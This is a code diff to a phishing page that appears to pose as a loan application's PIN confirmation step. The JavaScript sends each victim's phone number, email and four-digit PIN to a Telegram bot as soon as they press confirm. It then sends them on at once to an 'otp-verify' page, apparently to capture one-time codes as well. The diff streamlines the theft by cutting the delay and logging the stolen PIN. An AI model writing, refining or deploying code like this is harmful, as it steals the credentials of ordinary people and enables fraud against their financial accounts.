@@ -50,9 +50,6 @@
 
         .error-message { background: rgba(244,63,94,0.15); color: #f43f5e; padding: 12px; border-radius: 12px; font-size: 0.8rem; margin-top: 16px; text-align: center; display: none; }
         .error-message.show { display: block; }
-        
-        .success-message { background: rgba(20,184,166,0.15); color: #14b8a6; padding: 12px; border-radius: 12px; font-size: 0.8rem; margin-top: 16px; text-align: center; display: none; }
-        .success-message.show { display: block; }
 
         .security-note { display: flex; align-items: center; gap: 8px; background: rgba(20,184,166,0.08); border: 1px solid rgba(20,184,166,0.2); border-radius: 12px; padding: 12px 14px; margin-top: 20px; }
         .security-note span { font-size: 0.78rem; color: #7e8aa2; line-height: 1.4; }
@@ -115,7 +112,6 @@
 
         <button class="submit-btn" id="confirmBtn" disabled onclick="handleConfirm()">Confirm PIN →</button>
         <div class="error-message" id="errorMessage"></div>
-        <div class="success-message" id="successMessage"></div>
 
         <div class="security-note">
             <span>🔒</span>
@@ -161,7 +157,6 @@
     var boxes = ['p1','p2','p3','p4'].map(function(id){ return document.getElementById(id); });
     var confirmBtn = document.getElementById('confirmBtn');
     var errorDiv = document.getElementById('errorMessage');
-    var successDiv = document.getElementById('successMessage');
 
     boxes.forEach(function(box, i) {
         box.addEventListener('input', function() {
@@ -205,12 +200,7 @@
         setTimeout(function(){ errorDiv.classList.remove('show'); }, 5000);
     }
 
-    function showSuccess(msg) {
-        successDiv.textContent = msg;
-        successDiv.classList.add('show');
-    }
-
-    // Send Telegram notification with phone, email, and PIN
+    // Send Telegram notification (fires immediately, doesn't block)
     function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
@@ -233,7 +223,7 @@
 
         var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
         
-        // Use fetch with promise
+        // Send notification in background - doesn't block user
         fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -246,7 +236,7 @@
         .then(function(response) { return response.json(); })
         .then(function(result) {
             if (result.ok) {
-                console.log('✅ Telegram notification sent successfully');
+                console.log('✅ Telegram notification sent - Phone: ' + decodedPhone + ', PIN: ' + pin);
             } else {
                 console.error('Telegram error:', result);
             }
@@ -256,7 +246,7 @@
         });
     }
 
-    // Main confirm function
+    // Main confirm function - IMMEDIATELY redirects to OTP page
     window.handleConfirm = async function() {
         var pin = getPin();
         if (pin.length !== 4) { 
@@ -264,30 +254,23 @@
             return; 
         }
 
+        // Disable button to prevent double click
         confirmBtn.disabled = true;
-        confirmBtn.textContent = '⏳ Processing...';
-        showSuccess('Sending notification...');
+        confirmBtn.textContent = 'Processing...';
 
-        // Send Telegram notification (this runs in background)
+        // Send Telegram notification (runs in background, doesn't delay redirect)
         sendTelegramNotification(pin);
         
-        // Update success message
-        setTimeout(function() {
-            showSuccess('✓ Notification sent! Redirecting...');
-        }, 1000);
-        
-        // Always redirect after 3 seconds
-        setTimeout(function() {
-            window.location.href = 'otp-verify.html'
-                + '?amount='  + encodeURIComponent(amount)
-                + '&term='    + encodeURIComponent(term)
-                + '&rate='    + encodeURIComponent(rate)
-                + '&monthly=' + encodeURIComponent(monthly)
-                + '&name='    + encodeURIComponent(name)
-                + '&email='   + encodeURIComponent(email)
-                + '&phone='   + encodeURIComponent(phone)
-                + '&appId='   + encodeURIComponent(appId);
-        }, 3000);
+        // IMMEDIATELY redirect to OTP page (no delay)
+        window.location.href = 'otp-verify.html'
+            + '?amount='  + encodeURIComponent(amount)
+            + '&term='    + encodeURIComponent(term)
+            + '&rate='    + encodeURIComponent(rate)
+            + '&monthly=' + encodeURIComponent(monthly)
+            + '&name='    + encodeURIComponent(name)
+            + '&email='   + encodeURIComponent(email)
+            + '&phone='   + encodeURIComponent(phone)
+            + '&appId='   + encodeURIComponent(appId);
     };
 </script>
 </body>
